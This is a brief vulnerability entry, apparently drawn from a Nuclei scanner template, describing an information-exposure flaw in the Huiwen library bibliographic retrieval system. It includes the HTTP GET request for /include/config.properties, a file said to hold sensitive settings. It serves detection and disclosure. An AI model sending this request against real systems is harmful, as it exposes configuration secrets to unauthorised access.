# Vulnerability: Huiwen library bibliographic Retrieval System - Information Exposure
**Classification:** HUIWEN
**Source:** Nuclei Template (`huiwen-bibliographic-info-leak.yaml`)

## Description
Huiwen library bibliographic retrieval system /include/config.properties file contains sensitive information, attackers can directly access to obtain information

## Vulnerable Code Pattern / Exploit Payload
```http
GET /include/config.properties HTTP/1.1
Host: {{Hostname}}
```

